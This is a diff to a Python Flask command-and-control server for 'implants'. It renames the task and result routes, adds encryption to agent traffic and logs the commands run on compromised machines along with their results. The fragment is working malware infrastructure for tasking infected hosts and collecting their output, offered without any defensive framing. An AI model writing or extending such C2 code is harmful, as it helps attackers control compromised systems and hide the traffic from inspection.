@@ -221,8 +221,8 @@ def register_agent(): # --> this is a handler
 
     return encrypt_data({"status": "ok", "message": "Welcome!"})
 
-@app.route('/agent/send_task', methods=['POST'])
-def send_task():
+@app.route('/agent/get_task', methods=['POST'])
+def get_task():
     """
         listens to the /task route
         When an implant asks for a new task, this function will query the database
@@ -255,28 +255,29 @@ def send_task():
         print("[-] the agent has failed to authenticate")
         return encrypt_data({"status": "authentication failed"})
     
-@app.route('/agent/get_results', methods=['POST'])
-def get_results():
+@app.route('/agent/send_result', methods=['POST'])
+def send_result():
     """
         listens to the /task_results route
         When an implant sends back the results of a task, this function will store the results
         in the database
     """
-    data = request.json
+    data = decrypt_data(request.data)
     if data == None:
-        return jsonify({"status": "error: no data"})
+        return encrypt_data({"status": "error: no data"})
     agent_id = data["agent_id"]
     password = data["password"]
-    results = data["results"]
+    command = data["command"]
+    result = data["result"]
 
     if verify_agent_password(agent_id, password):
         print(f"[+] agent {agent_id} has successfully completed the task")
-        print(f"[+] here are the results: {results}")
+        print(f"[+] here are the results for {command}: {result}")
         agent = find_agent_by_id(agent_id)
-        return jsonify({"status": "ok"})
+        return encrypt_data({"status": "ok"})
     else:
         print("[-] the agent has failed to authenticate")
-        return jsonify({"status": "authentication failed"})
+        return encrypt_data({"status": "authentication failed"})
 
 
 
